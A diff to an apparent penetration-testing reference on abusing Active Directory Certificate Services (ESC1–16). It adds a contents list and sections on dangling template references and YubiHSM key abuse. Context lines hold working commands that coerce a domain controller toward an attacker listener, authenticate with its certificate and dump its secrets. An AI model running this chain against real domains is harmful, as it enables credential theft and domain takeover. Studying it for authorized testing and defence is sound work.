@@ -1,6 +1,30 @@
-# ADCS Certificate Abuse — ESC1-15 Attack Chains
+# ADCS Certificate Abuse — ESC Technique Map and Attack Chains
 
 ---
+
+## Contents
+
+- [Enumeration](#enumeration)
+- [Dangling CA template references](#dangling-ca-template-references)
+- [ESC1 — Enrollee-Supplied SAN](#esc1--enrollee-supplied-san)
+- [ESC2 — Any Purpose / SubCA Template](#esc2--any-purpose--subca-template)
+- [ESC3 — Certificate Request Agent](#esc3--certificate-request-agent)
+- [ESC4 — Writable Template ACL](#esc4--writable-template-acl)
+- [ESC6 — CA SAN flag](#esc6--editf_attributesubjectaltname2-on-ca)
+- [ESC7 — CA Manager / Officer Rights](#esc7--ca-manager--officer-rights)
+- [ESC8 — NTLM Relay](#esc8--ntlm-relay-to-adcs-web-enrollment)
+- [Shadow Credentials](#shadow-credentials)
+- [Certificate authentication](#certificate-authentication--credential-extraction)
+- [ESC9 — No Security Extension](#esc9--no-security-extension-ct_flag_no_security_extension)
+- [ESC10 — Weak Certificate Mapping](#esc10--weak-certificate-mapping-certificatemappingmethods)
+- [ESC11 — NTLM Relay to ICPR](#esc11--ntlm-relay-to-icpr-rpc-certificate-enrollment)
+- [ESC12 — YubiHSM Key Material](#esc12--yubihsm-key-material)
+- [ESC13 — Issuance Policy Group Link](#esc13--issuance-policy-oid-group-link)
+- [ESC14 — Explicit Certificate Mapping](#esc14--explicit-certificate-mapping-altsecurityidentities)
+- [ESC15 — Application Policy Injection](#esc15--ekuwu--application-policy-injection-cve-2024-49019)
+- [ESC16 — SID Extension Disabled](#esc16--sid-security-extension-globally-disabled)
+- [ESC5 — Golden Certificate](#golden-certificate-esc5--ca-key-compromise)
+- [TLS Service Impersonation](#adcs-for-tls-service-impersonation-non-pkinit)
 
 ## Enumeration
 
@@ -16,6 +40,33 @@ certipy find -u user@domain.local -p pass -dc-ip <dc_ip> -vulnerable -json -outp
 ```
 
 Output shows: CA name, template name, ESC class, enrollment rights, vulnerable flags.
+
+### Dangling CA template references
+
+A CA can publish a name in its `certificateTemplates` attribute even when no matching
+`pKICertificateTemplate` object exists. Compare the values on the Enrollment Services
+object with template `cn` values under the Certificate Templates container in the
+Configuration naming context; do not treat a missing object as exploitable by itself.
+
+```text
+CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,...
+CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,...
+```
+
+For each orphaned name, inspect the template container DACL for `CreateChild`,
+`WriteDacl`, `WriteOwner`, or broader control. Resolve the ACE SID manually and expand
+nested group membership when LDAP visibility or SID lookup is restricted: a failed
+`certipy find -vulnerable` SID resolution is inconclusive, not proof of safety. Creating a
+functional template may also require authority to create the associated
+`msPKI-Enterprise-Oid` object (or an equivalent valid OID path). In the dangling case the
+stale name is already published, so no CA publication right is implied; changing the CA's
+`certificateTemplates` list instead requires **Manage CA** or equivalent CA administration.
+**Issue and Manage Certificates** governs certificate-manager/officer actions, not template
+publication. Confirm that the created template grants the requester enrollment and that no
+issuance requirement blocks the request. Treat this as an AD CS misconfiguration chain,
+not a security-boundary bypass. Preserve the original CA/template ACL evidence, clone only
+schema-required attributes from a known template, validate the resulting ESC class, and
+remove the test object after the authorized proof.
 
 ---
 
@@ -286,6 +337,23 @@ python3 Coercer.py coerce -u user -p pass -d domain.local -t <dc_ip> -l <attacke
 certipy auth -pfx <dc_hostname>.pfx -domain domain.local -dc-ip <dc_ip>
 impacket-secretsdump -k -no-pass domain.local/<dc_hostname>$@<dc_fqdn>
 ```
+
+---
+
+## ESC12 — YubiHSM Key Material
+
+When an enterprise CA protects its signing key with a YubiHSM2, readable deployment material on the
+CA host can still collapse the boundary through the YubiHSM KSP/middleware. First confirm that the CA
+uses that KSP. Then inspect the host for connector configuration, `AuthKeysetID`, and the cleartext
+`AuthKeysetPassword` needed to open an HSM session. Connector settings alone are not evidence of
+compromise.
+
+If the complete authentication material is recoverable, validate access with vendor tooling and use
+only the intended CA signing key. The weakness permits unauthorized use of the non-exportable key to
+sign certificates; it does not imply that the private key was extracted. The result has the same
+durable impact as ESC5 because certificates can be forged independently of enrollment policy.
+Preserve key identifiers and avoid destructive HSM operations; rotation and revocation are
+remediation, not validation steps.
 
 ---
 
